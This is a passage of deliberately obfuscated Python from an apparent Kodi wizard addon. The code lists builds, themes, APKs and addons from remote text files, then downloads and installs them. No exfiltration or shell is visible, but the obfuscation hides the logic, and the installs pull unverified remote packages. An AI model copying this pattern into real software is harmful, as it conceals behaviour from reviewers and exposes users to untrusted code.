						for OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ,O0OOOO0OOO00OOOO0 ,OO0OO0000OO0O000O ,O000000000OOOOOOO ,O00O000OO00O0O0OO ,O0OO0O000OOOOOOO0 ,OOO0O0O0O000O0OOO ,O00O00000O0O0OOO0 ,O0O00O0O00OO000OO in OO0OOO0O00O000O0O :#line:2798
							if not SHOWADULT =='true'and O00O00000O0O0OOO0 .lower ()=='yes':continue #line:2799
							if not DEVELOPER =='true'and wiz .strTest (OOOO0OO00O00OO0O0 ):continue #line:2800
							O00OO0OO0OOOO00O0 =int (float (O000000000OOOOOOO ))#line:2801
							if O00OO0OO0OOOO00O0 <=15 :#line:2802
								OOOO0OO000OO0OO0O =createMenu ('install','',OOOO0OO00O00OO0O0 )#line:2803
								addDir ('[%s] %s (v%s)'%(float (O000000000OOOOOOO ),OOOO0OO00O00OO0O0 ,OOO0O00O00OOOO000 ),'viewbuild',OOOO0OO00O00OO0O0 ,description =O0O00O0O00OO000OO ,fanart =OOO0O0O0O000O0OOO ,icon =O0OO0O000OOOOOOO0 ,menu =OOOO0OO000OO0OO0O ,themeit =THEME2 )#line:2804
		elif OO00OO0OOOOOOOO00 >0 :#line:2805
			if OOOO000O0OOOO0O00 >0 :#line:2806
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2807
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2808
			else :#line:2809
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2810
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2811
	setView ('files','viewType')#line:2812
def viewBuild (O0OOO0O0O0O0OOO00 ):#line:2814
    OO0OOO000OOOOO000 =[]#line:2815
    OO0O0OOO00OO0OO00 =read_skin ('favourite')#line:2816
    for OO0O0OO0O0OOOO0OO in OO0O0OOO00OO0OO00 :#line:2817
        OO0OO0O000O0O00OO =OO0O0OOO00OO0OO00 [OO0O0OO0O0OOOO0OO ]#line:2818
        OO0OOO000OOOOO000 .append ((OO0OO0O000O0O00OO ['name'],OO0OO0O000O0O00OO ['version'],OO0OO0O000O0O00OO ['url'],OO0OO0O000O0O00OO ['gui'],OO0OO0O000O0O00OO ['Kodi'],OO0OO0O000O0O00OO ['theme'],OO0OO0O000O0O00OO ['icon'],OO0OO0O000O0O00OO ['fanart'],OO0OO0O000O0O00OO ['preview'],OO0OO0O000O0O00OO ['adult'],OO0OO0O000O0O00OO ['preview'],OO0OO0O000O0O00OO ['filesize'],OO0OO0O000O0O00OO ['updatesize']))#line:2819
    O0000OOO0OOO00O0O =wiz .workingURL (SPEEDFILE )#line:2821
    if not O0000OOO0OOO00O0O ==True :#line:2822
        addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2823
        addFile ('%s'%O0000OOO0OOO00O0O ,'',themeit =THEME3 )#line:2824
        return #line:2825
    if wiz .checkBuild (O0OOO0O0O0O0OOO00 ,'version')==False :#line:2826
        addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2827
        addFile ('%s was not found in the builds list.'%O0OOO0O0O0O0OOO00 ,'',themeit =THEME3 )#line:2828
        return #line:2829
    OO0O00O000OOO0000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2830
    for O0OOO0O0O0O0OOO00 ,O0OOO0000000OO00O ,O00000OO0OOOOO000 ,O0OOO00O0OOO0O00O ,OO0OOOO0O00OOOO0O ,OO00OOOOOO0OOO000 ,OOO00O0O0OO000O0O ,O0O0OO000O0OO0O0O ,O00OO0O00O000O00O ,O0O000OOO0OO0000O ,OOO00OOO00OO0O00O ,OOO00O00O0O000OO0 ,OO0000O0OO00OOOO0 in OO0OOO000OOOOO000 :#line:2833
        OOO00O0O0OO000O0O =OOO00O0O0OO000O0O if wiz .workingURL (OOO00O0O0OO000O0O )else ICON #line:2834
        O0O0OO000O0OO0O0O =O0O0OO000O0OO0O0O if wiz .workingURL (O0O0OO000O0OO0O0O )else FANART #line:2835
        OO0O0O0000O0O00O0 ='%s (v%s)'%(O0OOO0O0O0O0OOO00 ,O0OOO0000000OO00O )#line:2836
        if BUILDNAME ==O0OOO0O0O0O0OOO00 and O0OOO0000000OO00O >BUILDVERSION :#line:2837
            OO0O0O0000O0O00O0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0O0O0000O0O00O0 ,BUILDVERSION )#line:2838
        OOOOOOO0O00000O0O =int (float (KODIV ));O000OO0O00O00O00O =int (float (OO0OOOO0O00OOOO0O ))#line:2847
        if not OOOOOOO0O00000O0O ==O000OO0O00O00O00O :#line:2848
            if OOOOOOO0O00000O0O ==16 and O000OO0O00O00O00O <=15 :OOOOOOOO0OO00O000 =False #line:2849
            else :OOOOOOOO0OO00O000 =True #line:2850
        else :OOOOOOOO0OO00O000 =False #line:2851
        addFile ('התקנה','install',O0OOO0O0O0O0OOO00 ,'fresh',description =OOO00OOO00OO0O00O ,fanart =O0O0OO000O0OO0O0O ,icon =OOO00O0O0OO000O0O ,themeit =THEME1 )#line:2855
        if not OO00OOOOOO0OOO000 =='http://':#line:2858
            if wiz .workingURL (OO00OOOOOO0OOO000 )==True :#line:2859
                addFile (wiz .sep ('THEMES'),'',fanart =O0O0OO000O0OO0O0O ,icon =OOO00O0O0OO000O0O ,themeit =THEME3 )#line:2860
                OO0O00O000OOO0000 =wiz .openURL (OO00OOOOOO0OOO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2861
                OO0OOO000OOOOO000 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O00O000OOO0000 )#line:2862
                for OO0OO0000OOOO00OO ,O000O00OOOOOO00O0 ,OOO00OO0OOOOOOOO0 ,OOOO0O00OO000OOOO ,O00O00000OO00O00O ,OOO00OOO00OO0O00O in OO0OOO000OOOOO000 :#line:2863
                    if not SHOWADULT =='true'and O00O00000OO00O00O .lower ()=='yes':continue #line:2864
                    OOO00OO0OOOOOOOO0 =OOO00OO0OOOOOOOO0 if OOO00OO0OOOOOOOO0 =='http://'else OOO00O0O0OO000O0O #line:2865
                    OOOO0O00OO000OOOO =OOOO0O00OO000OOOO if OOOO0O00OO000OOOO =='http://'else O0O0OO000O0OO0O0O #line:2866
                    addFile (OO0OO0000OOOO00OO if not OO0OO0000OOOO00OO ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO0OO0000OOOO00OO ,'theme',O0OOO0O0O0O0OOO00 ,OO0OO0000OOOO00OO ,description =OOO00OOO00OO0O00O ,fanart =OOOO0O00OO000OOOO ,icon =OOO00OO0OOOOOOOO0 ,themeit =THEME3 )#line:2867
    setView ('files','viewType')#line:2868
def viewThirdList (O0OOO00O000OO0O00 ):#line:2870
	OO0OOO00OO0OO0O00 =eval ('THIRD%sNAME'%O0OOO00O000OO0O00 )#line:2871
	O0000OO00OOO0O000 =eval ('THIRD%sURL'%O0OOO00O000OO0O00 )#line:2872
	OO0O00O0O00OOO0O0 =wiz .workingURL (O0000OO00OOO0O000 )#line:2873
	if not OO0O00O0O00OOO0O0 ==True :#line:2874
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2875
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2876
	else :#line:2877
		OOO000O0OO0OOOOO0 ,O0O00OOO000OOO00O =wiz .thirdParty (O0000OO00OOO0O000 )#line:2878
		addFile ("[B]%s[/B]"%OO0OOO00OO0OO0O00 ,'',themeit =THEME3 )#line:2879
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2880
		if OOO000O0OO0OOOOO0 :#line:2881
			for OO0OOO00OO0OO0O00 ,O000000000O00OO00 ,O0000OO00OOO0O000 ,OO0O0OOO00O00O00O ,O00000000O0000000 ,OOOO0OO0O0OO0O0OO ,OO000O0000OO0000O ,O00O00OO00000O0OO in O0O00OOO000OOO00O :#line:2882
				if not SHOWADULT =='true'and OO000O0000OO0000O .lower ()=='yes':continue #line:2883
				addFile ("[%s] %s v%s"%(OO0O0OOO00O00O00O ,OO0OOO00OO0OO0O00 ,O000000000O00OO00 ),'installthird',OO0OOO00OO0OO0O00 ,O0000OO00OOO0O000 ,icon =O00000000O0000000 ,fanart =OOOO0OO0O0OO0O0OO ,description =O00O00OO00000O0OO ,themeit =THEME2 )#line:2884
		else :#line:2885
			for OO0OOO00OO0OO0O00 ,O0000OO00OOO0O000 ,O00000000O0000000 ,OOOO0OO0O0OO0O0OO ,O00O00OO00000O0OO in O0O00OOO000OOO00O :#line:2886
				addFile (OO0OOO00OO0OO0O00 ,'installthird',OO0OOO00OO0OO0O00 ,O0000OO00OOO0O000 ,icon =O00000000O0000000 ,fanart =OOOO0OO0O0OO0O0OO ,description =O00O00OO00000O0OO ,themeit =THEME2 )#line:2887
def editThirdParty (O0000O00OOO0OOO00 ):#line:2889
	O0O0OOO0O0OOOOO00 =eval ('THIRD%sNAME'%O0000O00OOO0OOO00 )#line:2890
	OOO00OOOO00000000 =eval ('THIRD%sURL'%O0000O00OOO0OOO00 )#line:2891
	OOO0O000OO0O0O000 =wiz .getKeyboard (O0O0OOO0O0OOOOO00 ,'Enter the Name of the Wizard')#line:2892
	O0O00OOO00OOO0000 =wiz .getKeyboard (OOO00OOOO00000000 ,'Enter the URL of the Wizard Text')#line:2893
	wiz .setS ('wizard%sname'%O0000O00OOO0OOO00 ,OOO0O000OO0O0O000 )#line:2895
	wiz .setS ('wizard%surl'%O0000O00OOO0OOO00 ,O0O00OOO00OOO0000 )#line:2896
def apkScraper (name =""):#line:2898
	if name =='kodi':#line:2899
		OOO000OOO0000OOOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2900
		O0O0OO00O00O0O0O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2901
		O0O0000000OOOO0O0 =wiz .openURL (OOO000OOO0000OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2902
		OO0O00OOOO00O0OOO =wiz .openURL (O0O0OO00O00O0O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2903
		O0O0O000O00O00O00 =0 #line:2904
		OO0OOOOO00OO00OOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O0000000OOOO0O0 )#line:2905
		O000O00O0O0O0O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O00OOOO00O0OOO )#line:2906
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2908
		OOO000OOO0O00OO0O =False #line:2909
		for O0OOO00OO0O0OOOO0 ,name ,O0O0OOOO0O00OOO00 ,OO00O0OO00O00OOO0 in OO0OOOOO00OO00OOO :#line:2910
			if O0OOO00OO0O0OOOO0 in ['../','old/']:continue #line:2911
			if not O0OOO00OO0O0OOOO0 .endswith ('.apk'):continue #line:2912
			if not O0OOO00OO0O0OOOO0 .find ('_')==-1 and OOO000OOO0O00OO0O ==True :continue #line:2913
			try :#line:2914
				O0O0OO00O0OOO0OOO =name .split ('-')#line:2915
				if not O0OOO00OO0O0OOOO0 .find ('_')==-1 :#line:2916
					OOO000OOO0O00OO0O =True #line:2917
					O0OO000O0000O0000 ,OO00O00O00OO000O0 =O0O0OO00O0OOO0OOO [2 ].split ('_')#line:2918
				else :#line:2919
					O0OO000O0000O0000 =O0O0OO00O0OOO0OOO [2 ]#line:2920
					OO00O00O00OO000O0 =''#line:2921
				OOOOOO0OOOOO0O000 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO00O0OOO0OOO [0 ].title (),O0O0OO00O0OOO0OOO [1 ],OO00O00O00OO000O0 .upper (),O0OO000O0000O0000 ,COLOR2 ,O0O0OOOO0O00OOO00 .replace (' ',''),COLOR1 ,OO00O0OO00O00OOO0 )#line:2922
				O0O0OO00OOOOOO0OO =urljoin (OOO000OOO0000OOOO ,O0OOO00OO0O0OOOO0 )#line:2923
				addFile (OOOOOO0OOOOO0O000 ,'apkinstall',"%s v%s%s %s"%(O0O0OO00O0OOO0OOO [0 ].title (),O0O0OO00O0OOO0OOO [1 ],OO00O00O00OO000O0 .upper (),O0OO000O0000O0000 ),O0O0OO00OOOOOO0OO )#line:2924
				O0O0O000O00O00O00 +=1 #line:2925
			except :#line:2926
				wiz .log ("Error on: %s"%name )#line:2927
		for O0OOO00OO0O0OOOO0 ,name ,O0O0OOOO0O00OOO00 ,OO00O0OO00O00OOO0 in O000O00O0O0O0O0O0 :#line:2929
			if O0OOO00OO0O0OOOO0 in ['../','old/']:continue #line:2930
			if not O0OOO00OO0O0OOOO0 .endswith ('.apk'):continue #line:2931
			if not O0OOO00OO0O0OOOO0 .find ('_')==-1 :continue #line:2932
			try :#line:2933
				O0O0OO00O0OOO0OOO =name .split ('-')#line:2934
				OOOOOO0OOOOO0O000 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO00O0OOO0OOO [0 ].title (),O0O0OO00O0OOO0OOO [1 ],O0O0OO00O0OOO0OOO [2 ],COLOR2 ,O0O0OOOO0O00OOO00 .replace (' ',''),COLOR1 ,OO00O0OO00O00OOO0 )#line:2935
				O0O0OO00OOOOOO0OO =urljoin (O0O0OO00O00O0O0O0 ,O0OOO00OO0O0OOOO0 )#line:2936
				addFile (OOOOOO0OOOOO0O000 ,'apkinstall',"%s v%s %s"%(O0O0OO00O0OOO0OOO [0 ].title (),O0O0OO00O0OOO0OOO [1 ],O0O0OO00O0OOO0OOO [2 ]),O0O0OO00OOOOOO0OO )#line:2937
				O0O0O000O00O00O00 +=1 #line:2938
			except :#line:2939
				wiz .log ("Error on: %s"%name )#line:2940
		if O0O0O000O00O00O00 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2941
	elif name =='spmc':#line:2942
		OOOOOO0OOOO0O000O ='https://github.com/koying/SPMC/releases'#line:2943
		O0O0000000OOOO0O0 =wiz .openURL (OOOOOO0OOOO0O000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2944
		O0O0O000O00O00O00 =0 #line:2945
		OO0OOOOO00OO00OOO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0O0000000OOOO0O0 )#line:2946
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2948
		for name ,OO0O0O0O0OOOOOOOO in OO0OOOOO00OO00OOO :#line:2950
			O000000000O0OO0OO =''#line:2951
			O000O00O0O0O0O0O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO0O0O0O0OOOOOOOO )#line:2952
			for OO00O000OO0O00O0O ,O0OO0OO00O0O000O0 ,O00O00OO0OO000O0O in O000O00O0O0O0O0O0 :#line:2953
				if O00O00OO0OO000O0O .find ('armeabi')==-1 :continue #line:2954
				if O00O00OO0OO000O0O .find ('launcher')>-1 :continue #line:2955
				O000000000O0OO0OO =urljoin ('https://github.com',OO00O000OO0O00O0O )#line:2956
				break #line:2957
		if O0O0O000O00O00O00 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2959
def apkMenu (url =None ):#line:2961
	if url ==None :#line:2962
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2965
	if not APKFILE =='http://':#line:2966
		if url ==None :#line:2967
			O00O0OOO00OOOOOO0 =wiz .workingURL (APKFILE )#line:2968
			O00O0OOOO00O000OO =uservar .APKFILE #line:2969
		else :#line:2970
			O00O0OOO00OOOOOO0 =wiz .workingURL (url )#line:2971
			O00O0OOOO00O000OO =url #line:2972
		if O00O0OOO00OOOOOO0 ==True :#line:2973
			OOO000OO0OO0OOOOO =wiz .openURL (O00O0OOOO00O000OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2974
			O00O0OOOOOOO00OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO000OO0OO0OOOOO )#line:2975
			if len (O00O0OOOOOOO00OOO )>0 :#line:2976
				OO0OOOO0OO000O00O =0 #line:2977
				for O0OO00O0O00O0OOOO ,OOOOOO0O0OOO0O0OO ,url ,OO0O00O0OO0OO00O0 ,O0O00000OOO000OO0 ,O00OOOOOO0000OO00 ,OO00OO0O0OO0OOOO0 in O00O0OOOOOOO00OOO :#line:2978
					if not SHOWADULT =='true'and O00OOOOOO0000OO00 .lower ()=='yes':continue #line:2979
					if OOOOOO0O0OOO0O0OO .lower ()=='yes':#line:2980
						OO0OOOO0OO000O00O +=1 #line:2981
						addDir ("[B]%s[/B]"%O0OO00O0O00O0OOOO ,'apk',url ,description =OO00OO0O0OO0OOOO0 ,icon =OO0O00O0OO0OO00O0 ,fanart =O0O00000OOO000OO0 ,themeit =THEME3 )#line:2982
					else :#line:2983
						OO0OOOO0OO000O00O +=1 #line:2984
						addFile (O0OO00O0O00O0OOOO ,'apkinstall',O0OO00O0O00O0OOOO ,url ,description =OO00OO0O0OO0OOOO0 ,icon =OO0O00O0OO0OO00O0 ,fanart =O0O00000OOO000OO0 ,themeit =THEME2 )#line:2985
					if OO0OOOO0OO000O00O <1 :#line:2986
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2987
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2988
		else :#line:2989
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2990
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2991
			addFile ('%s'%O00O0OOO00OOOOOO0 ,'',themeit =THEME3 )#line:2992
		return #line:2993
	else :wiz .log ("[APK Menu] No APK list added.")#line:2994
	setView ('files','viewType')#line:2995
def addonMenu (url =None ):#line:2997
	if not ADDONFILE =='http://':#line:2998
		if url ==None :#line:2999
			OO00O00000000OOO0 =wiz .workingURL (ADDONFILE )#line:3000
			OOO0O000O00OO00O0 =uservar .ADDONFILE #line:3001
		else :#line:3002
			OO00O00000000OOO0 =wiz .workingURL (url )#line:3003
			OOO0O000O00OO00O0 =url #line:3004
		if OO00O00000000OOO0 ==True :#line:3005
			O000O000OOOOOO0O0 =wiz .openURL (OOO0O000O00OO00O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:3006
			O000000O000O0OO0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000O000OOOOOO0O0 )#line:3007
			if len (O000000O000O0OO0O )>0 :#line:3008
				O00000O0OOOOOO000 =0 #line:3009
				for O0O0O0OOOOOOO0O00 ,O0O00OOOO0000O000 ,url ,O0O00OO00OO0000OO ,O00000OO0O0OO0O0O ,OOOO00OOO0OOO00O0 ,O0O0OOOOOOOOO00O0 ,O000O000OOOO0O0O0 ,O00O0OO00000O0O0O ,O0OO00OOOOO00O00O in O000000O000O0OO0O :#line:3010
					if O0O00OOOO0000O000 .lower ()=='section':#line:3011
						O00000O0OOOOOO000 +=1 #line:3012
						addDir ("[B]%s[/B]"%O0O0O0OOOOOOO0O00 ,'addons',url ,description =O0OO00OOOOO00O00O ,icon =O0O0OOOOOOOOO00O0 ,fanart =O000O000OOOO0O0O0 ,themeit =THEME3 )#line:3013
					else :#line:3014
						if not SHOWADULT =='true'and O00O0OO00000O0O0O .lower ()=='yes':continue #line:3015
						try :#line:3016
							OOOO0O00000O0O0O0 =xbmcaddon .Addon (id =O0O00OOOO0000O000 ).getAddonInfo ('path')#line:3017
							if os .path .exists (OOOO0O00000O0O0O0 ):#line:3018
								O0O0O0OOOOOOO0O00 ="[COLOR green][Installed][/COLOR] %s"%O0O0O0OOOOOOO0O00 #line:3019
						except :#line:3020
							pass #line:3021
						O00000O0OOOOOO000 +=1 #line:3022
						addFile (O0O0O0OOOOOOO0O00 ,'addoninstall',O0O00OOOO0000O000 ,OOO0O000O00OO00O0 ,description =O0OO00OOOOO00O00O ,icon =O0O0OOOOOOOOO00O0 ,fanart =O000O000OOOO0O0O0 ,themeit =THEME2 )#line:3023
					if O00000O0OOOOOO000 <1 :#line:3024
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:3025
			else :#line:3026
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:3027
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:3028
		else :#line:3029
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:3030
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:3031
			addFile ('%s'%OO00O00000000OOO0 ,'',themeit =THEME3 )#line:3032
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:3033
	setView ('files','viewType')#line:3034
def addonInstaller (O0OO00000OOOOO00O ,OOOO0OO0O00O0OO0O ):#line:3036
	if not ADDONFILE =='http://':#line:3037
		O000OOO0O0OO0OOO0 =wiz .workingURL (OOOO0OO0O00O0OO0O )#line:3038
		if O000OOO0O0OO0OOO0 ==True :#line:3039
			OOO000000O00000OO =wiz .openURL (OOOO0OO0O00O0OO0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:3040
			OO000O00000000000 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OO00000OOOOO00O ).findall (OOO000000O00000OO )#line:3041
			if len (OO000O00000000000 )>0 :#line:3042
				for O0O0OOOOOOOOO000O ,OOOO0OO0O00O0OO0O ,O000O00O0OO0O000O ,O0OOOO00O0OO0O0OO ,OO00OOO0O0OO00OOO ,OOOO000O00O0OOO0O ,O0OOO0O0OO0OOO00O ,OOOOOOO00O00OOO0O ,O0OO0O0O0OOOOOOO0 in OO000O00000000000 :#line:3043
					if os .path .exists (os .path .join (ADDONS ,O0OO00000OOOOO00O )):#line:3044
						OOO00OO0OOOO00O00 =['Launch Addon','Remove Addon']#line:3045
						O00O00OOO0OOO0OOO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOO00OO0OOOO00O00 )#line:3046
						if O00O00OOO0OOO0OOO ==0 :#line:3047
							wiz .ebi ('RunAddon(%s)'%O0OO00000OOOOO00O )#line:3048
							xbmc .sleep (1000 )#line:3049
							return True #line:3050
						elif O00O00OOO0OOO0OOO ==1 :#line:3051
							wiz .cleanHouse (os .path .join (ADDONS ,O0OO00000OOOOO00O ))#line:3052
							try :wiz .removeFolder (os .path .join (ADDONS ,O0OO00000OOOOO00O ))#line:3053
							except :pass #line:3054
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OO00000OOOOO00O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:3055
								removeAddonData (O0OO00000OOOOO00O )#line:3056
							wiz .refresh ()#line:3057
							return True #line:3058
						else :#line:3059
							return False #line:3060
					OO0O0O0O00O00O0O0 =os .path .join (ADDONS ,O000O00O0OO0O000O )#line:3061
					if not O000O00O0OO0O000O .lower ()=='none'and not os .path .exists (OO0O0O0O00O00O0O0 ):#line:3062
						wiz .log ("Repository not installed, installing it")#line:3063
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0OO00000OOOOO00O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000O00O0OO0O000O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:3064
							OO000O0O00OO00O0O =wiz .parseDOM (wiz .openURL (O0OOOO00O0OO0O0OO ),'addon',ret ='version',attrs ={'id':O000O00O0OO0O000O })#line:3065
							if len (OO000O0O00OO00O0O )>0 :#line:3066
								O0O000O00OOOOOO0O ='%s%s-%s.zip'%(OO00OOO0O0OO00OOO ,O000O00O0OO0O000O ,OO000O0O00OO00O0O [0 ])#line:3067
								wiz .log (O0O000O00OOOOOO0O )#line:3068
								if KODIV >=17 :wiz .addonDatabase (O000O00O0OO0O000O ,1 )#line:3069
								installAddon (O000O00O0OO0O000O ,O0O000O00OOOOOO0O )#line:3070
								wiz .ebi ('UpdateAddonRepos()')#line:3071
								wiz .log ("Installing Addon from Kodi")#line:3073
								O0OOOO0O00OO0000O =installFromKodi (O0OO00000OOOOO00O )#line:3074
								wiz .log ("Install from Kodi: %s"%O0OOOO0O00OO0000O )#line:3075
								if O0OOOO0O00OO0000O :#line:3076
									wiz .refresh ()#line:3077
									return True #line:3078
							else :#line:3079
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O000O00O0OO0O000O )#line:3080
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0OO00000OOOOO00O ,O000O00O0OO0O000O ))#line:3081
					elif O000O00O0OO0O000O .lower ()=='none':#line:3082
						wiz .log ("No repository, installing addon")#line:3083
						O0OOOO0O0OO00OOOO =O0OO00000OOOOO00O #line:3084
						O00O00OO0O00OOO0O =OOOO0OO0O00O0OO0O #line:3085
						installAddon (O0OO00000OOOOO00O ,OOOO0OO0O00O0OO0O )#line:3086
						wiz .refresh ()#line:3087
						return True #line:3088
					else :#line:3089
						wiz .log ("Repository installed, installing addon")#line:3090
						O0OOOO0O00OO0000O =installFromKodi (O0OO00000OOOOO00O ,False )#line:3091
						if O0OOOO0O00OO0000O :#line:3092
							wiz .refresh ()#line:3093
							return True #line:3094
					if os .path .exists (os .path .join (ADDONS ,O0OO00000OOOOO00O )):return True #line:3095
					O0OOO0O0O0OO0O0OO =wiz .parseDOM (wiz .openURL (O0OOOO00O0OO0O0OO ),'addon',ret ='version',attrs ={'id':O0OO00000OOOOO00O })#line:3096
					if len (O0OOO0O0O0OO0O0OO )>0 :#line:3097
						OOOO0OO0O00O0OO0O ="%s%s-%s.zip"%(OOOO0OO0O00O0OO0O ,O0OO00000OOOOO00O ,O0OOO0O0O0OO0O0OO [0 ])#line:3098
						wiz .log (str (OOOO0OO0O00O0OO0O ))#line:3099
						if KODIV >=17 :wiz .addonDatabase (O0OO00000OOOOO00O ,1 )#line:3100
						installAddon (O0OO00000OOOOO00O ,OOOO0OO0O00O0OO0O )#line:3101
						wiz .refresh ()#line:3102
					else :#line:3103
						wiz .log ("no match");return False #line:3104
			else :wiz .log ("[Addon Installer] Invalid Format")#line:3105
		else :wiz .log ("[Addon Installer] Text File: %s"%O000OOO0O0OO0OOO0 )#line:3106
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:3107
def installFromKodi (O0OOOO00OOO0O0OO0 ,over =True ):#line:3109
	if over ==True :#line:3110
		xbmc .sleep (2000 )#line:3111
	wiz .ebi ('RunPlugin(plugin://%s)'%O0OOOO00OOO0O0OO0 )#line:3113
	if not wiz .whileWindow ('yesnodialog'):#line:3114
		return False #line:3115
	xbmc .sleep (1000 )#line:3116
	if wiz .whileWindow ('okdialog'):#line:3117
		return False #line:3118
	wiz .whileWindow ('progressdialog')#line:3119
	if os .path .exists (os .path .join (ADDONS ,O0OOOO00OOO0O0OO0 )):return True #line:3120
	else :return False #line:3121
def installAddon (O0OOOO0O00OOO0000 ,O000000OOO0OOO000 ):#line:3123
	if not wiz .workingURL (O000000OOO0OOO000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OOOO0O00OOO0000 ,COLOR2 ));return #line:3124
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3125
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO0O00OOO0000 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:3126
	O0OO00O00O0OO000O =O000000OOO0OOO000 .split ('/')#line:3127
	OOO00000OOOOOO0OO =os .path .join (PACKAGES ,O0OO00O00O0OO000O [-1 ])#line:3128
	try :os .remove (OOO00000OOOOOO0OO )#line:3129
	except :pass #line:3130
	downloader .download (O000000OOO0OOO000 ,OOO00000OOOOOO0OO ,DP )#line:3131
	OOOOO00OO00O0O000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO0O00OOO0000 )#line:3132
